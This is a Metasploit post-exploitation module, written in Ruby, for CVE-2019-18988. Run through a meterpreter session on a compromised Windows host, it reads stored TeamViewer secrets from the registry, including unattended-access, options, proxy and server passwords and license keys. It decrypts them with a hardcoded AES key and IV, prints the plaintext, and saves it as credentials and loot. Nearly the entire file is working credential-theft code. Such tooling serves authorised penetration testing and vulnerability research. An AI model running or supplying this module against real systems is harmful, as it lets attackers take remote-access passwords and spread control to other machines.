##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Windows Gather TeamViewer Passwords',
        'Description'   => %q{ This module will find and decrypt stored TeamViewer passwords },
        'License'       => MSF_LICENSE,
        'References'    => [ ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'] ],
        'Author'        => [ 'Nic Losby <blurbdust[at]gmail.com>' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def app_list
    results = ""
    keys = [
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer", "Version" ],
      [ "HKLM\\SOFTWARE\\TeamViewer\\Temp", "SecurityPasswordExported" ],
      [ "HKLM\\SOFTWARE\\TeamViewer", "Version" ],
    ]

    locations = [
      { :value => 'OptionsPasswordAES', :description => 'Options Password'},
      { :value => 'SecurityPasswordAES', :description => 'Unattended Password'}, # for < v9.x
      { :value => 'SecurityPasswordExported', :description => 'Exported Unattended Password'},
      { :value => 'ServerPasswordAES', :description => 'Backend Server Password'}, # unused according to TeamViewer
      { :value => 'ProxyPasswordAES', :description => 'Proxy Password'},
      { :value => 'LicenseKeyAES', :description => 'Perpetual License Key'}, # for <= v14
    ]

    keys.each do |parent_key, child_key|

      locations.each do |location|
        secret = registry_getvaldata(parent_key, location[:value])
        next if secret.nil?
        plaintext = decrypt(secret)
        next if plaintext.nil?
        print_good("Found #{location[:description]}: #{plaintext}")
        results << "#{location[:description]}: #{plaintext}\n"
        store_valid_credential(
          user: nil,
          private: plaintext,
          private_type: :password,
          service_data: {
            address: session.session_host,
            last_attempted_at: nil,
            origin_type: :session,
            port: 5938, # https://community.teamviewer.com/t5/Knowledge-Base/Which-ports-are-used-by-TeamViewer/ta-p/4139
            post_reference_name: self.refname,
            protocol: 'tcp',
            service_name: 'teamviewer',
            session_id: session_db_id,
            status: Metasploit::Model::Login::Status::UNTRIED
          }
        )
      end
    end

    #Only save data to disk when there's something in the table
    unless results.empty?
      path = store_loot("host.teamviewer_passwords", "text/plain", session, results, "teamviewer_passwords.txt", "TeamViewer Passwords")
      print_good("Passwords stored in: #{path.to_s}")
    end
  end

  def decrypt(encrypted_data)
    password = ""
    return password unless encrypted_data

    password = ""

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new("AES-128-CBC")
    begin
      aes.decrypt
      aes.key = key
      aes.iv = iv
      plaintext = aes.update(encrypted_data)
      password = Rex::Text.to_ascii(plaintext, 'utf-16le')
      if plaintext.empty?
        return nil
      end
    rescue OpenSSL::Cipher::CipherError => e
      print_error("Unable to decrypt the data. Exception: #{e}")
    end

    password
  end

  def run
    print_status("Finding TeamViewer Passwords on #{sysinfo['Computer']}")
    app_list
  end
end
